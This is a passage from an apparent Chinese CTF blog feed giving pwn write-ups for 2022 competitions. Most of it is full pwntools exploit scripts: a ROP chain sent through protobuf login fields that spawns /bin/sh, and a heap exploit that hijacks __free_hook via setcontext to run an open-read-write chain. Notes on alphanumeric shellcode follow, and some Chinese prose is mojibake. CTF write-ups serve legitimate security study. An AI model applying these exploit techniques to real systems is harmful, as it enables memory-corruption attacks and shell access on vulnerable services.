pause()<br><br>pop_rdi=<span class="hljs-number">0x0000000000404982</span> <span class="hljs-comment"># pop rdi ; ret</span><br>pop_rsi=<span class="hljs-number">0x0000000000588bbe</span> <span class="hljs-comment"># pop rsi ; ret</span><br>pop_rdx=<span class="hljs-number">0x000000000040454f</span> <span class="hljs-comment"># pop rdx ; ret</span><br>pop_rax=<span class="hljs-number">0x00000000005bdb8a</span> <span class="hljs-comment"># pop rax ; ret</span><br><span class="hljs-comment">#syscall=0x0000000000403c99 # syscall</span><br>syscall=<span class="hljs-built_in">next</span>(elf.search(asm(<span class="hljs-string">&#x27;syscall\nret&#x27;</span>)))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(syscall))<br><span class="hljs-comment">#syscall=0x68f0a4</span><br>bss=<span class="hljs-number">0x81A2E0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">pd</span>):<br>    d=ctf_pb2.pwn()<br>    d.username=pd<br>    d.password=<span class="hljs-string">b&#x27;p&#x27;</span><br>    strs=d.SerializeToString()<br>    r.sendafter(<span class="hljs-string">b&#x27;Login: &#x27;</span>,strs)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gadget</span>(<span class="hljs-params">off,val,zero_byte=<span class="hljs-number">5</span></span>):<br>    <span class="hljs-keyword">if</span> val == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            s(<span class="hljs-string">b&#x27;a&#x27;</span>*(off+<span class="hljs-number">7</span>-i))<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(zero_byte):<br>        s(<span class="hljs-string">b&#x27;a&#x27;</span>*(off+<span class="hljs-number">7</span>-i))<br>    s(<span class="hljs-string">b&#x27;a&#x27;</span>*off+p64(val)[:(<span class="hljs-number">8</span>-zero_byte)])<br><br>gadget(<span class="hljs-number">0x1d0</span>,syscall)<br>gadget(<span class="hljs-number">0x1c8</span>,<span class="hljs-number">0</span>)<br>gadget(<span class="hljs-number">0x1c0</span>,pop_rdx)<br>gadget(<span class="hljs-number">0x1b8</span>,<span class="hljs-number">0</span>)<br>gadget(<span class="hljs-number">0x1b0</span>,pop_rsi)<br>gadget(<span class="hljs-number">0x1a8</span>,bss)<br>gadget(<span class="hljs-number">0x1a0</span>,pop_rdi)<br>gadget(<span class="hljs-number">0x198</span>,<span class="hljs-number">59</span>,<span class="hljs-number">7</span>)<br>gadget(<span class="hljs-number">0x190</span>,pop_rax)<br><br>gadget(<span class="hljs-number">0x188</span>,syscall)<br>gadget(<span class="hljs-number">0x180</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>)<br>gadget(<span class="hljs-number">0x178</span>,pop_rdx)<br>gadget(<span class="hljs-number">0x170</span>,bss)<br>gadget(<span class="hljs-number">0x168</span>,pop_rsi)<br>gadget(<span class="hljs-number">0x160</span>,<span class="hljs-number">0</span>)<br>gadget(<span class="hljs-number">0x158</span>,pop_rdi)<br>gadget(<span class="hljs-number">0x150</span>,<span class="hljs-number">0</span>)<br>gadget(<span class="hljs-number">0x148</span>,pop_rax)<br><br>d = ctf_pb2.pwn()<br>d.username = p32(<span class="hljs-number">0xdead</span>)<br>d.password = p32(<span class="hljs-number">0xbeef</span>)<br><span class="hljs-built_in">print</span>(d.SerializeToString())<br>strs=d.SerializeToString()<br><span class="hljs-comment">#debug()</span><br><span class="hljs-built_in">print</span>(strs)<br>r.sendafter(<span class="hljs-string">b&#x27;Login: &#x27;</span>,strs)<br><span class="hljs-comment">#debug()</span><br>sleep(<span class="hljs-number">1</span>) <span class="hljs-comment">#need to sleep ,or might be EOF</span><br>r.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="sandboxheap">sandboxheap</h2><p>openä¸ ï¼ˆreadå’Œwriteï¼‰ä¸èƒ½åŒæ—¶ä½¿ç”¨</p><p>ç”¨0x10000çš„åŠŸèƒ½å»ä½¿ç”¨open</p><p>æ¥ç€alarmè½¯ä¸­æ–­ï¼Œ</p><p>å†ç”¨readï¼Œwriteå°±è¯»å‡ºflagäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./sandboxheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    <span class="hljs-comment">#r = process(local_file)</span><br>    r = process(argv = [<span class="hljs-string">&#x27;./sandbox&#x27;</span>, local_file])<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;101.201.71.136&#x27;</span>, <span class="hljs-number">23712</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims          :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-comment">#------------------------------</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<span class="hljs-comment">#0~6</span><br>    add(i,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x28</span>)<br><br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">12</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-number">0x28</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br>edit(<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">0x38</span>+<span class="hljs-string">&#x27;0&#x27;</span>)<br><br>edit(<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">4</span>)<br><br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">12</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0xa0</span>)<br>show(<span class="hljs-number">10</span>)<br>libc_base=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span><br>info(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]+libc_base<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]+libc_base<br>info(<span class="hljs-string">&#x27;free_hook&#x27;</span>,free_hook)<br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x18</span>)<span class="hljs-comment">#10</span><br>delete(<span class="hljs-number">14</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">intToBit</span>(<span class="hljs-params">n</span>):<br>        bits = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> n&gt;<span class="hljs-number">0</span>:<br>            bits = <span class="hljs-built_in">str</span>(n%<span class="hljs-number">2</span>) + bits<br>            n = n//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(bits)!=<span class="hljs-number">8</span>:<br>            bits = <span class="hljs-string">&quot;0&quot;</span>+bits<br>        <span class="hljs-keyword">return</span> bits<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bitToInt</span>(<span class="hljs-params">n</span>):<br>        <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(n)):<br>            <span class="hljs-built_in">sum</span> += <span class="hljs-built_in">int</span>(n[i])*<span class="hljs-number">2</span>**(<span class="hljs-built_in">len</span>(n)-i-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverseBits</span>(<span class="hljs-params">n</span>):<br>        <span class="hljs-keyword">if</span> n==<span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>        bits = intToBit(n)<br>        <span class="hljs-keyword">return</span> bitToInt(bits[::-<span class="hljs-number">1</span>])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">n</span>):<br>    n8=(n/(<span class="hljs-number">0x100000000000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n7=(n/(<span class="hljs-number">0x1000000000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n6=(n/(<span class="hljs-number">0x10000000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n5=(n/(<span class="hljs-number">0x100000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n4=(n/(<span class="hljs-number">0x1000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n3=(n/(<span class="hljs-number">0x10000</span>))&amp;<span class="hljs-number">0xff</span><br>    n2=(n/(<span class="hljs-number">0x100</span>))&amp;<span class="hljs-number">0xff</span><br>    n1=(n/<span class="hljs-number">0x1</span>)&amp;<span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> ((<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n1))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n2))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n3))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n4))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n5))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n6))[<span class="hljs-number">2</span>:])).rjust(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;0&#x27;</span>)+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n7))[<span class="hljs-number">2</span>:])).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>)+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n8))[<span class="hljs-number">2</span>:])).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))<br><br><span class="hljs-comment">#print(hex(reverseBits(0x7f)))</span><br>setcontext=libc_base+libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]+<span class="hljs-number">53</span><br><br><br>edit(<span class="hljs-number">10</span>,change(<span class="hljs-number">0x6161616161616161</span>))<br>show(<span class="hljs-number">10</span>)<br>ru(<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>heap_base=uu64(rc(<span class="hljs-number">6</span>))-<span class="hljs-number">0xa10</span>+<span class="hljs-number">0xa00</span><br>info(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><br>edit(<span class="hljs-number">10</span>,change(free_hook))<br><br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x18</span>)<br><br><br>add(<span class="hljs-number">15</span>,<span class="hljs-number">0x18</span>)<br><br>edit(<span class="hljs-number">15</span>,change(setcontext)  ) <br>pop_rdi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>)))<br>pop_rsi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>)))<br>pop_rdx = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdx\nret&#x27;</span>)))<br>pop_rax = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>)))<br>syscall = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;syscall\nret&#x27;</span>)))<br>ret = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;ret&#x27;</span>)))<br>read=libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]+libc_base<br>write=libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]+libc_base<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(pop_rdi))<br><br>edit(<span class="hljs-number">13</span>,change(<span class="hljs-number">0x67616c66</span>))<br>flag_addr=heap_base+<span class="hljs-number">0x800</span><br><br><br><span class="hljs-comment">#orw=change(pop_rax)+&#x27;01010000&#x27;+&#x27;0&#x27;*8*7+change(pop_rdi)+change(heap_base)+change(pop_rsi)+&#x27;00000000&#x27;+&#x27;00000010&#x27;+&#x27;0&#x27;*8*6+change(pop_rdx)+&#x27;11100000&#x27;+&#x27;0&#x27;*8*7+change(syscall)+change(heap_base+0x880)</span><br><span class="hljs-comment">#orw+=change(0x622fbf4856f63148)+&#x27;10010110&#x27;+&#x27;01110110&#x27;+&#x27;11110100&#x27;+&#x27;11110100&#x27;+&#x27;11001110&#x27;+&#x27;00010110&#x27;+&#x27;11101010&#x27;+&#x27;00101010&#x27;+&#x27;11111010&#x27;+&#x27;01010110&#x27;+&#x27;11011100&#x27;+&#x27;00011010&#x27;+&#x27;10011001&#x27;+&#x27;11110000&#x27;+&#x27;10100000&#x27;+&#x27;00000000&#x27;</span><br><br>orw=change(pop_rdi)+<span class="hljs-string">&#x27;11000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rax)+<span class="hljs-string">&#x27;00001000&#x27;</span>+<span class="hljs-string">&#x27;11100100&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">6</span>+change(syscall)<br>orw+=change(pop_rdi)+change(flag_addr)+change(pop_rsi)+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">8</span>+change(pop_rax)+<span class="hljs-string">&#x27;01000000&#x27;</span>+<span class="hljs-string">&#x27;00000000&#x27;</span>*<span class="hljs-number">7</span>+change(syscall)<br>orw+=change(pop_rdi)+<span class="hljs-string">&#x27;01000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rax)+<span class="hljs-string">&#x27;10100100&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(syscall)<br>orw+=change(pop_rdi)+<span class="hljs-string">&#x27;11000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rsi)+change(flag_addr)+change(pop_rdx)+<span class="hljs-string">&#x27;00001010&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rax)+<span class="hljs-string">&#x27;00000000&#x27;</span>+<span class="hljs-string">&#x27;00000000&#x27;</span>*<span class="hljs-number">7</span>+change(syscall)<br>orw+=change(pop_rdi)+<span class="hljs-string">&#x27;10000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rsi)+change(flag_addr)+change(pop_rdx)+<span class="hljs-string">&#x27;00001010&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(write)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x198</span>)<br>edit(<span class="hljs-number">1</span>,orw)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x198</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">0xa0</span>+change(heap_base+<span class="hljs-number">0x820</span>+<span class="hljs-number">0x10</span>)+change(ret))<br><span class="hljs-comment">#debug()</span><br>delete(<span class="hljs-number">2</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/sandboxflag.png" alt="sandboxflag"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rop</tag>
      
      <tag>off by null</tag>
      
      <tag>IO_leak</tag>
      
      <tag>fastbin reverse into tcache</tag>
      
      <tag>orw</tag>
      
      <tag>ret2setconext</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF X GFCTF 2022åæœˆæŒ‘æˆ˜èµ›pwn</title>
    <link href="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€ï¼š">å‰è¨€ï¼š</h2><p>å› ä¸ºå®åœ¨æ˜¯å¤ªèœï¼Œæ‰€ä»¥ä¸€é¢˜éƒ½æ²¡åšå‡ºæ¥ï¼Œè·Ÿç€<a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247502987&amp;idx=1&amp;sn=39df1e5a1638db91f716f975fbeb69c1&amp;chksm=fbf456fbcc83dfedf587a21112de8e6fae17942e848974c5eafd827ab94af9d65aa87bef424b&amp;mpshare=1&amp;scene=23&amp;srcid=1025bRDnAZQ3o5bMtZAgFHMu&amp;sharer_sharetime=1666699678887&amp;sharer_shareid=600395608e88237687e56b1c66678009#rd">å®˜æ–¹wp</a>å¤ç°ä¸€ä¸‹</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/rank.png" alt="rank"></p><h2 id="1-5">1!5!</h2><h3 id="0x01-ç¡®å®šæ±‡ç¼–">0x01 ç¡®å®šæ±‡ç¼–</h3><p>é¢˜ç›®é™åˆ¶è¾“å…¥æŒ‡å®šæ˜æ–‡å­—ç¬¦15aABCDEFGHIJKLMNOPQRSUVWXYZï¼Œä¸”é•¿åº¦è¦åˆšå¥½0x200</p><p>å…ˆç¡®å®šèƒ½è¿˜ç”¨ä»€ä¹ˆæ±‡ç¼–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#\x31\x35\x61\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x55\x56\x57\x58\x59\x5A</span><br>push:<br>    \x50 P  push   rax<br>    \x51        Q             push   rcx<br>    \x52        R             push   rdx<br>    \x53        S             push   rbx<br>    \x55        U             push   rbp<br>    \x56        V             push   rsi<br>    \x57        W             push   rdi<br>    \x41\x50---&gt;\x41\x57  push r8---&gt;push r15<br>pop:<br>    \x58        X             pop    rax<br>    \x59        Y             pop    rcx<br>    \x5a        Z             pop    rdx<br>    \x41\x58AX    pop    r8<br>    \x41\x59AY  pop    r9<br>    \x41\x5aAZ  pop    r10<br>xor:<br>    \x35xxxx5XXXXxor    eax,xxxx<br>    \x31\x31 xor    DWORD PTR [rcx], esi<br>    <br>    \x31xy1xy(xå†³å®šä¸¤ä¸ªå¯„å­˜å™¨ï¼Œyå†³å®šç«‹å³æ•°) <br>    xor    DWORD PTR [å¯„å­˜å™¨+ç«‹å³æ•°], å¯„å­˜å™¨<br>    ä¾‹ï¼š<br>    \x31\x61\x31xor    DWORD PTR [rcx+<span class="hljs-number">0x31</span>], esp<br>    \x31\x41\x35xor    DWORD PTR [rcx+<span class="hljs-number">0x35</span>], eax<br></code></pre></td></tr></table></figure><p><code>xor eax,xxxx</code>å¯ä»¥å¼‚æˆ–å‡ºå°äº0x7fçš„å­—èŠ‚</p><p>ï¼ˆé™åˆ¶å­—ç¬¦çš„èŒƒå›´å°äº0x5aï¼ŒäºŒè¿›åˆ¶æœ€é«˜ä½åªèƒ½ä¸º0ï¼Œå¼‚æˆ–åŒä¸ºé›¶ï¼Œæ‰€ä»¥æœ€å¤§åªèƒ½é€ å‡º0x7få³<code>01111111</code>ï¼‰</p><p><code>xor DWORD PTR [å¯„å­˜å™¨+ç«‹å³æ•°], eax</code>å¯ä»¥æŠŠå€¼å†™å…¥æŒ‡å®šä½ç½®</p><p>é…åˆ<code>push</code>ï¼Œ<code>pop</code>ç­‰å‘½ä»¤åŠ ä¸Šæ®‹ç•™åœ¨<code>rdx</code>å¯„å­˜å™¨ä¸Šçš„<code>0x10000</code>åœ°å€ï¼Œå¯ä»¥åœ¨<code>0x10000</code>å¾€åçš„åœ°å€å†™å…¥å°äº<code>0x7f</code>å­—èŠ‚çš„å€¼ï¼Œå»å½“ä½œå‘½ä»¤æ‰§è¡Œ</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å°äº0x7fçš„å‘½ä»¤ï¼Œå³å¯ç”¨ä¸€äº›å¦‚<code>sub byte [rax+1],cl</code>è¿™äº›å‘½ä»¤ï¼Œæ¥é€ 